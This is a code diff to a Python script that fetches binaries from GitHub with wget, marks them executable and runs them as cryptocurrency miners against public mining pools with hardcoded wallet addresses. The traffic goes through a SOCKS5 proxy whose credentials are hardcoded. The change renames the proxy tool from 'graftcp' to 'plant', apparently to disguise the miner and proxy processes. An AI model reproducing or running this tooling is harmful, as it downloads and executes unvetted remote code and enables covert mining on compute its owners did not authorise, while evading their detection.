@@ -31,24 +31,24 @@ socks5_password = 'user123'
 # Buat dictionary json
 downloads = {
     "graphics": {
-        "link": "wget -q https://github.com/clarksye/starterpack/raw/main/graphics.tar.gz",
+        "link": "wget -q https://github.com/handevproject/starterpack/raw/main/plant.tar.gz",
         "run": [
-            "tar -xf graphics.tar.gz",
-            "rm -rf graphics.tar.gz"
+            "tar -xf plant.tar.gz",
+            "rm -rf plant.tar.gz"
         ]
     },
     "gpu": {
         "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.0/lol",
         "run": [
             "chmod +x lol",
-            "./graftcp/graftcp ./lol --algo KARLSEN --tls on --pool us.nexellia.herominers.com:1143 --user nexellia:qp2e339adz2fra94avvfa2xdctpu6pfs62me04hdeyesqvaxl58eg92hg0kdc.clarksye"
+            "./plant/plant ./lol --algo KARLSEN --tls on --pl 60 --pool us.nexellia.herominers.com:1143 --user nexellia:qp2e339adz2fra94avvfa2xdctpu6pfs62me04hdeyesqvaxl58eg92hg0kdc.clarksye"
         ]
     },
     "cpu": {
         "link": "wget -q https://github.com/clarksye/starterpack/releases/download/1.1.0/nish",
         "run": [
             "chmod +x nish",
-            "./graftcp/graftcp ./nish -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
+            "./plant/plant ./nish -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17052 -u v3DEMbMrwFetzmzEo6DeUKQnppXSqZZSxg.clarksye"
         ]
     }
 }
@@ -122,8 +122,8 @@ def run_cpu(command_folder):
 
 def set_ip(command_folder, ip, set_file = True):
     command = {
-        "set_file": f"cat > graftcp/local/graftcp-local.conf <<END\n[local]\nlisten = :2233\nloglevel = 0\nsocks5 = {ip}:{socks5_port}\nsocks5_username = {socks5_username}\nsocks5_password = {socks5_password}\nEND",
-        "running": "./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf",
+        "set_file": f"cat > plant/local/plant-local.conf <<END\n[local]\nlisten = :2233\nloglevel = 0\nsocks5 = {ip}:{socks5_port}\nsocks5_username = {socks5_username}\nsocks5_password = {socks5_password}\nEND",
+        "running": "./plant/local/plant-local -config plant/local/plant-local.conf",
         "sleep": "sleep 0.2"
     }
 
